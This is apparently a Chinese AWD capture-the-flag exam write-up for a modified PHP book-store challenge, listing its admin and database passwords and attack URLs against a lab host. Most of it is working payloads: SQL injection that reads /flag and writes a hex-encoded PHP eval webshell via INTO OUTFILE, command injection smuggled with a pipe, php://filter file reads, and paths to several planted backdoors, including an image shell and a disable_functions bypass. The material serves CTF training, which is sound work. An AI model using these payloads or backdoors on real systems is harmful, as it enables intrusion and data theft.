# 2023年12月24日 awd考核题目

交流联系sillybbb666@gmail.com

awd平台使用github开源平台mo-xiaoxi/AWD_CTF_Platform，代码自行修改启动题目

本题目基于2023年国赛西南赛区半决赛book改编

wp：

后台密码：mama123  30e32fcd467fcb2e9910636b99b49a4d171be7f3

数据库密码：root

注意sql注入可直接利用sqlmap --os-shell，导出文件权限默认开启，数据库端口默认开启

sql注入1：http://192.168.153.128:8801/book.php?bookisbn=1

sql注入2：http://192.168.153.128:8801/admin_edit.php?bookisbn=1

```
http://192.168.153.128:8802/book.php?bookisbn=1' union select 1,2,3,4,load_file("/flag"),6,7,8%23
```

```
http://192.168.153.128:8802/book.php?bookisbn=1' 'union select 1,0x3c3f70687020406576616c28245f504f53545b627468636c735d293b3f3e,3,4,5,6,7,8 into outfile '/tmp/sql.php'%23
```

命令执行：http://192.168.153.128:8801/functions/database_functions.php?target=127.0.0.1|cat /flag

任意文件上传：http://192.168.153.128:8801/admin_add.php

任意文件包含：http://192.168.153.128:8801/index.php?file=

任意文件读取：http://192.168.153.128:8801/?file=php://filter/read=convert.base64-encode/resource=/flag

默认后门：http://192.168.153.128:8801/bootstrap/test/bypass_disablefunc.php?cmd=cat%20/flag&outpath=/tmp/xx&sopath=/var/www/html/bootstrap/test/bypass_disablefunc_x64.so

图片马后门：http://192.168.153.128:8801/bootstrap/img/2.jpg

加密后门D盾有时查不出来，需自行排查

加密后门：http://192.168.153.128:8801/obs.php

隐藏后门：http://192.168.153.128:8801/.a.php
